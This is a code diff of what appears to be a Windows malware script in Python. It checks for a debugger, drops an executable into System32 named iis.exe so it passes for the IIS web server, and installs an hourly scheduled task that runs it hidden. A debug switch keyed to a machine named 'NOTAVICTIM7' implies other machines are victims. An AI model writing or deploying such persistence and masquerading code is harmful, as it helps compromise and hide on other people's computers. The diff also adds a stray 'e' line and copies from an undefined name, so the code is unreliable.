@@ -12,9 +12,10 @@ import time
 kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
 IsDebuggerPresent = kernel32.IsDebuggerPresent
 
-#only for me
-#debug = 1
-debug = 0
+if os.environ['COMPUTERNAME'] == 'NOTAVICTIM7':
+    debug =1
+else:
+    debug = 0
 
 def computer_Scheduler():
     if debug == 1:
@@ -22,7 +23,7 @@ def computer_Scheduler():
     subprocess.Popen(r"schtasks /Delete /TN iis /F")
     try:
         if os.path.isfile("C:\\Windows\\System32\\iis.exe"):
-            print("IIS Running")
+            print("IIS is in its place")
         else:
             shutil.copy(iis.exe, "C:\\Windows\\system32\\iis.exe")
     except shutil.Error as e:
@@ -30,7 +31,7 @@ def computer_Scheduler():
 
     time.sleep(5)
 
-    subprocess.Popen(r"schtasks /Create /SC HOURLY /MO 1 /TN IIS /TR C:\\Windows\\System32\\iis.exe")
+    subprocess.Popen(r'schtasks /Create /SC HOURLY /MO 1 /TN IIS /TR "cmd /k START /B C:\\Windows\\System32\\iis.exe"')
 
     time.sleep(5)
 
@@ -145,7 +146,7 @@ def main():
 
     except Exception as e:
         raise
-
+e
 if __name__ == '__main__':
     try:
         main()
